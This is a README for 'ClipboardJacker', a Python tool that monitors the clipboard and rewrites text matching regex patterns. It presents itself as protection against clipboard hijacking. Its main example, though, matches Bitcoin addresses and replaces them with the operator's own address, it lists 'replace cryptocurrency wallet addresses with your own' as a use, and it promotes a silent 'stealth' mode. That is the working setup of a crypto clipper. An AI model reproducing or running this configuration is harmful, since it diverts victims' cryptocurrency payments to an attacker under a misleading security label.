# ClipboardJacker 🎯

A powerful Python tool that automatically replaces text in your clipboard based on configurable regex patterns. Perfect for protecting against clipboard hijacking, standardizing text formats, and automating text replacements.

[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue)](https://www.python.org/downloads/)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Downloads](https://img.shields.io/pypi/dm/clipboardjacker)](https://pypi.org/project/clipboardjacker/)

## 🚀 Features

- 🔒 Real-time clipboard monitoring
- ⚡ Regex-based text replacement
- 🛡️ Rate limiting to prevent excessive replacements
- 🔕 Silent mode for stealth operation
- 📊 Pattern statistics tracking
- 🔄 Cross-platform support (Windows, macOS, Linux)

## 💡 Use Cases

### 🛡️ Security
- Protect against clipboard hijacking attacks
- Replace cryptocurrency wallet addresses with your own
- Mask sensitive information (emails, phone numbers, etc.)

### 🔄 Text Standardization
- Format dates and times consistently
- Standardize phone numbers
- Convert text case (e.g., to Title Case)
- Replace common typos

### 🚀 Automation
- Replace placeholder text with actual values
- Convert markdown to HTML
- Format code snippets
- Replace URLs with shortened versions

## 📦 Installation

```bash
# Install from PyPI
pip install clipboardjacker

# Or clone and install from source
git clone https://github.com/yourusername/ClipboardJacker.git
cd ClipboardJacker
pip install -e .
```

## 🛠️ Usage

### Basic Usage

```python
from clipboardjacker import ClipboardJacker, Config

# Define your patterns
patterns = [
    # Example: Replace cryptocurrency addresses
    {
        "regex": r"bc1[ac-hj-np-z02-9]{11,71}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}",
        "replace_with": "bc1qyourbitcoinaddresshere",
        "description": "Bitcoin (BTC) address",
        "priority": 1,
        "enabled": True
    },
    # Example: Format phone numbers
    {
        "regex": r"(\d{3})[-.]?(\d{3})[-.]?(\d{4})",
        "replace_with": r"(\1) \2-\3",
        "description": "Format phone numbers",
        "priority": 2,
        "enabled": True
    },
    # Example: Replace email addresses
    {
        "regex": r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b",
        "replace_with": "redacted@example.com",
        "description": "Mask email addresses",
        "priority": 3,
        "enabled": True
    }
]

# Create config
config = Config(
    patterns=patterns,
    rate_limit=1,  # 1 second between replacements
    log_level="INFO",
    silent=False
)

# Initialize and run
jacker = ClipboardJacker(config)
jacker.monitor_clipboard()
```

### Command Line Interface

```bash
# Run with default config
python -m clipboardjacker

# Run with custom config file
python -m clipboardjacker --config my_config.json

# Run in silent mode
python -m clipboardjacker --silent

# Set custom rate limit
python -m clipboardjacker --rate-limit 2
```

## ⚙️ Configuration

Create a `config.json` file:

```json
{
    "patterns": [
        {
            "regex": "your-regex-pattern",
            "replace_with": "replacement-text",
            "description": "Pattern description",
            "priority": 1,
            "enabled": true
        }
    ],
    "rate_limit": 1,
    "log_level": "INFO",
    "silent": false
}
```

## 🛡️ Security Features

- Rate limiting to prevent excessive clipboard modifications
- Pattern validation to ensure valid regex patterns
- Silent mode for stealth operation
- Backup of original clipboard content
- Priority-based pattern matching

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## ⭐ Star History

[![Star History Chart](https://api.star-history.com/svg?repos=yourusername/ClipboardJacker&type=Date)](https://star-history.com/#yourusername/ClipboardJacker&Date)

## 🙏 Acknowledgments

- Thanks to all contributors who have helped improve this project
- Inspired by the need for better clipboard security and automation

## 📞 Support

If you find this project helpful, please consider:
- ⭐ Starring the repository
- 🐛 Reporting bugs
- 💡 Suggesting new features
- 💰 Making a donation (crypto addresses available upon request)

---

Made with ❤️ by [Your Name](https://github.com/yourusername)
